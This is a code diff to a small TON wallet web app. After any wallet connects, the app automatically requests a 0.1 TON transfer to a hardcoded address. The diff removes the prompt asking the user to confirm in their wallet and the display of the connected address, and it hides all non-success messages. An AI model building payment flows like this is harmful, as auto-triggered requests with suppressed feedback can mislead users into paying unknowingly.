@@ -1,15 +1,16 @@
-// TON Transfer App - My Version: Simple & Robust
-
+// TON Transfer App - My Version: The Simplest
 class TONTransferApp {
     constructor() {
         this.tonConnectUI = null;
         this.staticRecipient = "0QD4uCCSKWqbVEeksIA_a2DLGftKWYpd-IO5TQIns6ZNP_-U";
         this.staticAmount = "0.1";
+        this.mainButton = null;
         this.init();
     }
 
     init() {
         try {
+            this.mainButton = document.getElementById('mainButton');
             this.tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                 manifestUrl: window.location.origin + '/ton-simple-html/tonconnect-manifest.json'
             });
@@ -37,22 +38,18 @@ class TONTransferApp {
     }
 
     setupEventListeners() {
-        document.getElementById('connectButton').addEventListener('click', () => {
-            this.connectWallet();
-        });
-
-        document.getElementById('transferButton').addEventListener('click', () => {
-            this.sendTransaction();
-        });
-
-        document.getElementById('disconnectButton').addEventListener('click', () => {
-            this.disconnectWallet();
+        this.mainButton.addEventListener('click', () => {
+            if (this.tonConnectUI.connected) {
+                this.disconnectWallet();
+            } else {
+                this.connectWallet();
+            }
         });
     }
 
     async connectWallet() {
         try {
-            this.showStatus('Opening wallet for auto-transfer...', 'loading');
+            this.showStatus('Opening wallet...', 'loading');
             await this.tonConnectUI.connectWallet();
         } catch (error) {
             this.showStatus('Connection failed: ' + error.message, 'error');
@@ -60,22 +57,18 @@ class TONTransferApp {
     }
 
     onWalletConnected(wallet) {
-        document.getElementById('connectionSection').style.display = 'none';
-        document.getElementById('transferSection').style.display = 'block';
+        this.mainButton.textContent = '✅ Connected';
+        this.mainButton.className = 'btn-success';
 
-        const shortAddress = wallet.account.address.slice(0, 8) + '...' + wallet.account.address.slice(-6);
-        document.getElementById('walletAddress').textContent = shortAddress;
-
-        this.showStatus('✅ Wallet connected! Starting auto-transfer...', 'success');
-
+        // Panggil fungsi transfer setelah 1 detik
         setTimeout(() => {
             this.sendTransaction();
         }, 1000);
     }
 
     onWalletDisconnected() {
-        document.getElementById('connectionSection').style.display = 'block';
-        document.getElementById('transferSection').style.display = 'none';
+        this.mainButton.textContent = 'Connect Wallet & Transfer';
+        this.mainButton.className = 'btn-primary';
         this.showStatus('Wallet disconnected', 'info');
     }
 
@@ -90,46 +83,28 @@ class TONTransferApp {
     async sendTransaction() {
         this.showStatus('🔄 Preparing transaction...', 'loading');
         try {
-            const wallet = this.tonConnectUI.wallet;
-            if (!wallet) {
-                this.showStatus('Wallet not ready for transaction', 'error');
+            if (!this.tonConnectUI.connected) {
                 return;
             }
 
-            const recipient = this.staticRecipient;
-            const amount = this.staticAmount;
-
-            const btn = document.getElementById('transferButton');
-            btn.disabled = true;
-            btn.textContent = 'Transferring...';
-
-            const amountInNano = (parseFloat(amount) * 1000000000).toString();
+            const amountInNano = (parseFloat(this.staticAmount) * 1000000000).toString();
 
             const transaction = {
                 validUntil: Math.floor(Date.now() / 1000) + 300,
                 messages: [{
-                    address: recipient,
+                    address: this.staticRecipient,
                     amount: amountInNano
                 }]
             };
 
-            this.showStatus('📱 Confirm transfer in your wallet...', 'loading');
             const result = await this.tonConnectUI.sendTransaction(transaction);
             
-            this.showStatus('✅ Transaction successful!', 'success');
+            // Tampilkan popup hanya untuk transfer yang berhasil
+            this.showStatus('✅ Transfer successful!', 'success');
         } catch (error) {
             console.error('Transaction failed:', error);
-            if (error.message.includes('User rejection')) {
-                this.showStatus('❌ Transaction cancelled', 'error');
-            } else {
-                this.showStatus('❌ Transaction failed: ' + error.message, 'error');
-            }
-        } finally {
-            const btn = document.getElementById('transferButton');
-            if (btn) {
-                btn.disabled = false;
-                btn.textContent = 'Send TON Again';
-            }
+            // Tampilkan error jika terjadi, untuk debugging
+            this.showStatus('❌ Transaction failed: ' + error.message, 'error');
         }
     }
 
@@ -138,14 +113,15 @@ class TONTransferApp {
         if (statusEl) {
             statusEl.textContent = message;
             statusEl.className = `status-message status-${type}`;
-            statusEl.style.display = 'block';
-
-            if (type === 'success' || type === 'error') {
+            
+            // Sesuai permintaan, tampilkan hanya untuk keberhasilan
+            if (type === 'success') {
+                statusEl.style.display = 'block';
                 setTimeout(() => {
-                    if (statusEl) {
-                        statusEl.style.display = 'none';
-                    }
+                    statusEl.style.display = 'none';
                 }, 5000);
+            } else {
+                statusEl.style.display = 'none';
             }
         }
     }
